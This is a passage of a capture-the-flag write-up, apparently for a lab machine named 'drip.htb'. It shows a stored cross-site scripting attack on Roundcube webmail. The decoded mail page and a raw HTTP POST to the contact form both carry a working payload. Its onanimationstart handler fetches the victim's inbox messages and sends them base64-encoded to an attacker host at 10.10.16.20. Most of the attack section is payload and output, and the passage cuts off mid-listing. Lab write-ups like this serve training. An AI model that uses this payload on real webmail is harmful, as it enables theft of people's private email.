<span class="built_in">id</span>=<span class="string">&quot;rcmbtn114&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;download&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;Export&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;edit asnew disabled&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn115&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;edit&#x27;,&#x27;new&#x27;,this,event)&quot;</span>&gt;Edit as new&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;source disabled&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn116&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;viewsource&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;Show <span class="built_in">source</span>&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;move disabled&quot;</span> aria-haspopup=<span class="string">&quot;true&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn117&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;move&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;&lt;span class=<span class="string">&quot;folder-selector-link&quot;</span>&gt;Move to...&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;copy disabled&quot;</span> aria-haspopup=<span class="string">&quot;true&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn118&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;copy&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;&lt;span class=<span class="string">&quot;folder-selector-link&quot;</span>&gt;Copy to...&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a target=<span class="string">&quot;_blank&quot;</span> class=<span class="string">&quot;extwin disabled&quot;</span> data-hidden=<span class="string">&quot;small&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn119&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;open&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;Open <span class="keyword">in</span> new window&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		</span><br><span class="line">	&lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div <span class="built_in">id</span>=<span class="string">&quot;markmessage-menu&quot;</span> class=<span class="string">&quot;popupmenu&quot;</span>&gt;</span><br><span class="line">	&lt;h3 <span class="built_in">id</span>=<span class="string">&quot;aria-label-markmessage-menu&quot;</span> class=<span class="string">&quot;voice&quot;</span>&gt;Mark selected messages as...&lt;/h3&gt;</span><br><span class="line">	&lt;ul class=<span class="string">&quot;menu listing&quot;</span> role=<span class="string">&quot;menu&quot;</span> aria-labelledby=<span class="string">&quot;aria-label-markmessage-menu&quot;</span>&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;read disabled&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn120&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;mark&#x27;,&#x27;read&#x27;,this,event)&quot;</span>&gt;As <span class="built_in">read</span>&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;unread disabled&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn121&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;mark&#x27;,&#x27;unread&#x27;,this,event)&quot;</span>&gt;As unread&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;flag disabled&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn122&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;mark&#x27;,&#x27;flagged&#x27;,this,event)&quot;</span>&gt;As flagged&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;unflag disabled&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn123&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;mark&#x27;,&#x27;unflagged&#x27;,this,event)&quot;</span>&gt;As unflagged&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">	&lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">	</span><br><span class="line">	&lt;div class=<span class="string">&quot;content frame-content&quot;</span> role=<span class="string">&quot;main&quot;</span>&gt;</span><br><span class="line">		&lt;div <span class="built_in">id</span>=<span class="string">&quot;message-header&quot;</span>&gt;</span><br><span class="line">			&lt;h2 class=<span class="string">&quot;subject&quot;</span>&gt;</span><br><span class="line">				&lt;span class=<span class="string">&quot;voice&quot;</span>&gt;Subject: &lt;/span&gt;</span><br><span class="line">				Customer Information Request</span><br><span class="line">				</span><br><span class="line">			&lt;/h2&gt;</span><br><span class="line">			&lt;div class=<span class="string">&quot;header&quot;</span>&gt;</span><br><span class="line">				&lt;img src=<span class="string">&quot;/?_task=addressbook&amp;amp;_action=photo&amp;amp;_email=kujen%40drip.htb&amp;amp;_error=1&amp;amp;_bgcolor=transparent&quot;</span> alt=<span class="string">&quot;Contact photo&quot;</span> class=<span class="string">&quot;contactphoto&quot;</span> onerror=<span class="string">&quot;this.onerror = null; this.src = &#x27;skins/elastic/images/contactpic.svg&#x27;;&quot;</span>&gt;</span><br><span class="line">				&lt;div class=<span class="string">&quot;header-content&quot;</span>&gt;</span><br><span class="line">					&lt;div class=<span class="string">&quot;header-summary&quot;</span>&gt;&lt;span&gt;From &lt;span class=<span class="string">&quot;adr&quot;</span>&gt;&lt;a href=<span class="string">&quot;mailto:kujen@drip.htb&quot;</span> class=<span class="string">&quot;rcmContactAddress&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;compose&#x27;,&#x27;kujen &amp;lt;kujen@drip.htb&amp;gt;&#x27;,this)&quot;</span> title=<span class="string">&quot;kujen@drip.htb&quot;</span>&gt;kujen&lt;/a&gt;&lt;a href=<span class="string">&quot;#add&quot;</span> title=<span class="string">&quot;Add to address book&quot;</span> class=<span class="string">&quot;rcmaddcontact&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;add-contact&#x27;,&#x27;kujen &amp;lt;kujen@drip.htb&amp;gt;&#x27;,this)&quot;</span>&gt;&lt;/a&gt;&lt;/span&gt; on &lt;span class=<span class="string">&quot;text-nowrap&quot;</span>&gt;2025-02-13 12:30&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;</span><br><span class="line">					&lt;table class=<span class="string">&quot;header-headers&quot;</span>&gt;&lt;tbody&gt;&lt;<span class="built_in">tr</span>&gt;&lt;td class=<span class="string">&quot;header-title&quot;</span>&gt;From&lt;/td&gt;&lt;td class=<span class="string">&quot;header from&quot;</span>&gt;&lt;span class=<span class="string">&quot;adr&quot;</span>&gt;&lt;a href=<span class="string">&quot;mailto:kujen@drip.htb&quot;</span> class=<span class="string">&quot;rcmContactAddress&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;compose&#x27;,&#x27;kujen &amp;lt;kujen@drip.htb&amp;gt;&#x27;,this)&quot;</span> title=<span class="string">&quot;kujen@drip.htb&quot;</span>&gt;kujen&lt;/a&gt;&lt;a href=<span class="string">&quot;#add&quot;</span> title=<span class="string">&quot;Add to address book&quot;</span> class=<span class="string">&quot;rcmaddcontact&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;add-contact&#x27;,&#x27;kujen &amp;lt;kujen@drip.htb&amp;gt;&#x27;,this)&quot;</span>&gt;&lt;/a&gt;&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;<span class="built_in">tr</span>&gt;&lt;td class=<span class="string">&quot;header-title&quot;</span>&gt;To&lt;/td&gt;&lt;td class=<span class="string">&quot;header to&quot;</span>&gt;&lt;span class=<span class="string">&quot;adr&quot;</span>&gt;&lt;a href=<span class="string">&quot;mailto:bcase@drip.htb&quot;</span> class=<span class="string">&quot;rcmContactAddress&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;compose&#x27;,&#x27;bcase@drip.htb&#x27;,this)&quot;</span> title=<span class="string">&quot;bcase@drip.htb&quot;</span>&gt;bcase@drip.htb&lt;/a&gt;&lt;a href=<span class="string">&quot;#add&quot;</span> title=<span class="string">&quot;Add to address book&quot;</span> class=<span class="string">&quot;rcmaddcontact&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;add-contact&#x27;,&#x27;bcase@drip.htb&#x27;,this)&quot;</span>&gt;&lt;/a&gt;&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;<span class="built_in">tr</span>&gt;&lt;td class=<span class="string">&quot;header-title&quot;</span>&gt;Reply-To&lt;/td&gt;&lt;td class=<span class="string">&quot;header replyto&quot;</span>&gt;&lt;span class=<span class="string">&quot;adr&quot;</span>&gt;&lt;a href=<span class="string">&quot;mailto:kujen@drip.htb&quot;</span> class=<span class="string">&quot;rcmContactAddress&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;compose&#x27;,&#x27;kujen@drip.htb&#x27;,this)&quot;</span> title=<span class="string">&quot;kujen@drip.htb&quot;</span>&gt;kujen@drip.htb&lt;/a&gt;&lt;a href=<span class="string">&quot;#add&quot;</span> title=<span class="string">&quot;Add to address book&quot;</span> class=<span class="string">&quot;rcmaddcontact&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;add-contact&#x27;,&#x27;kujen@drip.htb&#x27;,this)&quot;</span>&gt;&lt;/a&gt;&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;<span class="built_in">tr</span>&gt;&lt;td class=<span class="string">&quot;header-title&quot;</span>&gt;Date&lt;/td&gt;&lt;td class=<span class="string">&quot;header date&quot;</span>&gt;Today 12:30&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;</span><br><span class="line">					&lt;div class=<span class="string">&quot;header-links&quot;</span>&gt;</span><br><span class="line">						</span><br><span class="line">						</span><br><span class="line">						&lt;a href=<span class="string">&quot;#headers&quot;</span> class=<span class="string">&quot;headers-summary&quot;</span> onclick=<span class="string">&quot;return UI.headers_show(true)&quot;</span>&gt;&lt;/a&gt;</span><br><span class="line">						&lt;a href=<span class="string">&quot;#all-headers&quot;</span> class=<span class="string">&quot;headers-all&quot;</span> onclick=<span class="string">&quot;return UI.headers_dialog()&quot;</span>&gt;Headers&lt;/a&gt;</span><br><span class="line">						</span><br><span class="line">						</span><br><span class="line">							&lt;a class=<span class="string">&quot;plain&quot;</span> title=<span class="string">&quot;Display in plain text format&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn124&quot;</span> role=<span class="string">&quot;button&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;change-format&#x27;,&#x27;text&#x27;,this,event)&quot;</span>&gt;&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;Plain text&lt;/span&gt;&lt;/a&gt;</span><br><span class="line">						</span><br><span class="line">						</span><br><span class="line">					&lt;/div&gt;</span><br><span class="line">				&lt;/div&gt;</span><br><span class="line">			&lt;/div&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		&lt;div <span class="built_in">id</span>=<span class="string">&quot;message-content&quot;</span>&gt;</span><br><span class="line">			&lt;div class=<span class="string">&quot;leftcol&quot;</span> role=<span class="string">&quot;region&quot;</span> aria-labelledby=<span class="string">&quot;aria-label-messageattachments&quot;</span>&gt;</span><br><span class="line">				&lt;h2 <span class="built_in">id</span>=<span class="string">&quot;aria-label-messageattachments&quot;</span> class=<span class="string">&quot;voice&quot;</span>&gt;Attachments&lt;/h2&gt;</span><br><span class="line">				</span><br><span class="line">			&lt;/div&gt;</span><br><span class="line">			&lt;div class=<span class="string">&quot;rightcol&quot;</span> role=<span class="string">&quot;region&quot;</span> aria-labelledby=<span class="string">&quot;aria-label-messagebody&quot;</span>&gt;</span><br><span class="line">				&lt;h2 <span class="built_in">id</span>=<span class="string">&quot;aria-label-messagebody&quot;</span> class=<span class="string">&quot;voice&quot;</span>&gt;Message Body&lt;/h2&gt;</span><br><span class="line">				&lt;div <span class="built_in">id</span>=<span class="string">&quot;message-objects&quot;</span>&gt;</span><br><span class="line">&lt;div <span class="built_in">id</span>=<span class="string">&quot;remote-objects-message&quot;</span> class=<span class="string">&quot;notice&quot;</span> style=<span class="string">&quot;display: none&quot;</span>&gt;&lt;span&gt;To protect your privacy remote resources have been blocked.&lt;/span&gt;&amp;nbsp;&lt;span class=<span class="string">&quot;boxbuttons&quot;</span>&gt;&lt;a href=<span class="string">&quot;#loadremote&quot;</span> onclick=<span class="string">&quot;rcmail.command(&#x27;load-remote&#x27;)&quot;</span>&gt;Allow&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">				&lt;div <span class="built_in">id</span>=<span class="string">&quot;messagebody&quot;</span>&gt;&lt;div class=<span class="string">&quot;message-htmlpart&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;message-htmlpart1&quot;</span> style=<span class="string">&quot;background-color: foo&quot;</span>&gt;&lt;!-- html ignored --&gt;&lt;!-- <span class="built_in">head</span> ignored --&gt;&lt;!-- meta ignored --&gt;&lt;div class=<span class="string">&quot;rcmBody&quot;</span> title=<span class="string">&quot; name=&quot;</span>bar style=animation-name:progress-bar-stripes onanimationstart=fetch(&amp;<span class="comment">#039;/?_task=mail&amp;amp;_action=show&amp;amp;_uid=3&amp;amp;_mbox=INBOX&amp;amp;_extwin=1&amp;#039;).then(r=&amp;gt;r.text()).then(t=&amp;gt;fetch(`http://10.10.16.20/c=$&#123;btoa(t)&#125;`))  foo=bar&quot;&gt;Foo&lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Confidentiality Notice: This electronic communication may contain confidential or privileged information. Any unauthorized review, use, disclosure, copying, distribution, or taking of any part of this email is strictly prohibited.</span><br><span class="line">If you suspect that you<span class="string">&#x27;ve received a &amp;quot;phishing&amp;quot; e-mail, please forward the entire email to our security engineer at bcase@drip.htb&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">			&lt;/div&gt;</span></span><br><span class="line"><span class="string">		&lt;/div&gt;</span></span><br><span class="line"><span class="string">	&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;!-- popup menus --&gt;</span></span><br><span class="line"><span class="string">&lt;div id=&quot;attachmentmenu&quot; class=&quot;popupmenu&quot;&gt;</span></span><br><span class="line"><span class="string">	&lt;h3 id=&quot;aria-label-attachmentmenu&quot; class=&quot;voice&quot;&gt;Attachment options&lt;/h3&gt;</span></span><br><span class="line"><span class="string">	&lt;ul class=&quot;menu listing&quot; role=&quot;menu&quot; aria-labelledby=&quot;aria-label-attachmentmenu&quot;&gt;</span></span><br><span class="line"><span class="string">		&lt;li role=&quot;menuitem&quot;&gt;&lt;a id=&quot;attachmenuopen&quot; class=&quot;extwin disabled&quot; role=&quot;button&quot; tabindex=&quot;-1&quot; aria-disabled=&quot;true&quot; href=&quot;#&quot; onclick=&quot;return rcmail.command(&#x27;</span>open-attachment<span class="string">&#x27;,&#x27;</span><span class="string">&#x27;,this,event)&quot;&gt;Open&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">		&lt;li role=&quot;menuitem&quot;&gt;&lt;a id=&quot;attachmenudownload&quot; class=&quot;download disabled&quot; role=&quot;button&quot; tabindex=&quot;-1&quot; aria-disabled=&quot;true&quot; href=&quot;#&quot; onclick=&quot;return rcmail.command(&#x27;</span>download-attachment<span class="string">&#x27;,&#x27;</span><span class="string">&#x27;,this,event)&quot;&gt;Download&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">		</span></span><br><span class="line"><span class="string">	&lt;/ul&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;div id=&quot;mailto-menu&quot; class=&quot;popupmenu&quot;&gt;</span></span><br><span class="line"><span class="string">	&lt;h3 id=&quot;aria-label-mailtomenu&quot; class=&quot;voice&quot;&gt;Email address options&lt;/h3&gt;</span></span><br><span class="line"><span class="string">	&lt;ul class=&quot;menu listing&quot; role=&quot;menu&quot; aria-labelledby=&quot;aria-label-mailtomenu&quot;&gt;</span></span><br><span class="line"><span class="string">		&lt;li role=&quot;menuitem&quot;&gt;&lt;a class=&quot;addressbook&quot; id=&quot;rcmbtn125&quot; role=&quot;button&quot; tabindex=&quot;-1&quot; aria-disabled=&quot;true&quot; href=&quot;#&quot;&gt;Add to address book&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">		&lt;li role=&quot;menuitem&quot;&gt;&lt;a class=&quot;compose&quot; id=&quot;rcmbtn126&quot; role=&quot;button&quot; tabindex=&quot;-1&quot; aria-disabled=&quot;true&quot; href=&quot;#&quot;&gt;Compose mail to&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">		</span></span><br><span class="line"><span class="string">	&lt;/ul&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;div id=&quot;messagestack&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">$(function() &#123;</span></span><br><span class="line"><span class="string">rcmail.init();</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script src=&quot;skins/elastic/deps/bootstrap.bundle.min.js?s=1716107245&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script src=&quot;skins/elastic/ui.min.js?s=1716107237&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></div>
</details>


<p>Now we do all of it again but with uid&#x3D;2:</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/contact</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>drip.htb</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>440</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://drip.htb</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Sec-GPC</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.6</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://drip.htb/index</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiN2RlMTc2YWJmYzA5NDc3NDZlYjExOGYzYWEyODJkYWVmZTE3YWM1NCJ9.Z65HuQ.PAgXqD2w-R0gz0_G3BuKM-Lon84</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">name</span>=kujen&amp;email=kujen&amp;message=%<span class="number">3</span>Cbody%<span class="number">20</span>title%<span class="number">3</span>D%<span class="number">22</span>bgcolor%<span class="number">3</span>Dfoo%<span class="number">22</span>%<span class="number">20</span>name%<span class="number">3</span>D%<span class="number">22</span>bar%<span class="number">20</span>style%<span class="number">3</span>Danimation-name%<span class="number">3</span>Aprogress-bar-stripes%<span class="number">20</span>onanimationstart%<span class="number">3</span>Dfetch%<span class="number">28</span>%<span class="number">27</span>%<span class="number">2</span>F%<span class="number">3</span>F_task%<span class="number">3</span>Dmail%<span class="number">26</span>_action%<span class="number">3</span>Dshow%<span class="number">26</span>_uid%<span class="number">3</span>D2%<span class="number">26</span>_mbox%<span class="number">3</span>DINBOX%<span class="number">26</span>_extwin%<span class="number">3</span>D1%<span class="number">27</span>%<span class="number">29</span>.then%<span class="number">28</span>r%<span class="number">3</span>D%<span class="number">3</span>Er.text%<span class="number">28</span>%<span class="number">29</span>%<span class="number">29</span>.then%<span class="number">28</span>t%<span class="number">3</span>D%<span class="number">3</span>Efetch%<span class="number">28</span>%<span class="number">60</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F<span class="number">10.10.16.20</span>%<span class="number">2</span>Fc%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">7</span>Bbtoa%<span class="number">28</span>t%<span class="number">29</span>%<span class="number">7</span>D%<span class="number">60</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">20</span>%<span class="number">20</span>foo%<span class="number">3</span>Dbar%<span class="number">22</span>%<span class="number">3</span>EFoo%<span class="number">3</span>C%<span class="number">2</span>Fbody%<span class="number">3</span>E&amp;content=html&amp;recipient=bcase%<span class="number">40</span>drip.htb</span></span><br></pre></td></tr></table></figure></div>

<p>We receive another b64 value that we decode into another page:</p>
<details>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span 